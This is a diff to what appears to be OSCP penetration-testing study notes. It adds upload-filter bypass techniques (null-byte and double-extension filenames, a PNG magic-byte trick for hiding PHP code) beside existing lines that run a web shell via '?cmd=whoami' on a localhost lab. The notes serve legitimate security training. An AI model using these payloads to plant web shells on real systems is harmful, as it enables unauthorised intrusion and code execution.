@@ -1,4 +1,4 @@
-# Table of Content
+![image](https://github.com/nurijeon/OSCP/assets/14031269/427910a0-7dd6-477c-ab5c-96a1da0a5a28)![image](https://github.com/nurijeon/OSCP/assets/14031269/6f0d8209-ccfd-44ec-ad0e-5fd9f2cd6f82)# Table of Content
 - [General](#general)
   - [Important Files](#important-files)
   - [Upgrade Shell](#upgrade-shell)
@@ -1029,8 +1029,21 @@ ffuf -u http://localhost/labs/FUZZ -w /usr/share/wordlists/dirb/common.txt
 
 3. execute the file
 http://localhost/labs/uploads/simple.php?cmd=whoami
-
 ```
+**Bypass with nullbyte**
+```bash
+filename.php%00.png
+```
+
+**Bypass with multiple extension**
+```bash
+filename.php.png
+```
+
+**Bypass with magic byte**
+Use .php extension and magic byte for png and add php code somewhere in the original file to see 
+![image](https://github.com/nurijeon/OSCP/assets/14031269/b32fe546-14cd-40b6-b98f-d47899efa842)
+
 
 ## Tools
 ### SQLMAP
